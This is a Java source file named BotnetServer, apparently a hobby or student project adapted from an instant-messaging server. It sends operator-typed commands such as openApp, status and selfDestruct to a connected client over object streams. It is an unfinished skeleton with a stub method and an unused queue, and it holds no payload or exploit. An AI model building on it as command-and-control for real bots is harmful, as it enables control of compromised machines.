import java.net.*;
import java.io.*;

public class BotnetServer {
    private CommandQueue queue;
    private Socket socket;

    public BotnetServer(Socket socket){
        super();
        this.socket = socket;
    }
    
    private boolean send_command(String commandName){
        return true;
    }

    public void run() {

        try {
            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
            ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
            CommandProtocol commandP = new CommandProtocol();
            BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
            String outputLine;

            //*SEND INITIAL MESSAGE TO CLIENT THAT THE CONNECTION IS ESTABLISHED */
            outputLine = commandP.processCommand(null);
            
            System.out.println("Enter a Command name \n1) openApp\n2)status\n3)selfDestruct");
            String commandName = stdIn.readLine();
            // openApp
            // status
            // selfDestruct
            Command command = new Command(commandName);
            
            out.writeObject(command);
            // System.out.println(this.userName + ": " + outputLine);

            Command inCommand = (Command) in.readObject();
            
            
            //**WHILE YOU CAN READ INPUT FROM THE BUFFER STREAM */
            while ((inCommand.getResponse()) != null) {
                //**ALL MESSAGES IN THIS THREAD ARE FROM THE USERNAME THAT IS SAVED */
                //*print to this thread */
                // System.out.println(inCommand.getName() + ": " + inCommand.getResponse());
                //*determine output */
                outputLine = commandP.processCommand(inCommand);

                //*If the output is bye close connection */
                if (outputLine.equalsIgnoreCase("Bye.")){
                    command = new Command("");
                    out.writeObject(command);
                    break;
                }

                //*GET INPUT FROM SERVER SIDE */
                // System.out.print(this.userName + ": ");
                outputLine = stdIn.readLine();
                //*SEND OUTPUT TO CLIENT ON THREAD */
                command = new Command("");
                out.writeObject(command);

                try{
                    if(!outputLine.equalsIgnoreCase("Bye."))
                        inCommand = (Command) in.readObject();
                }catch (ClassNotFoundException cnfe){
                    System.err.println("IMServerThread: Problem reading object: class not found");
                    System.exit(1);
                }
            }
            //*CLOSE CONNECTION IF YOU ARE DONE */
            socket.close();
            in.close();
            out.close();
        } catch (ClassNotFoundException e){
            System.err.println("IMClient Class not found");
            System.exit(1);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}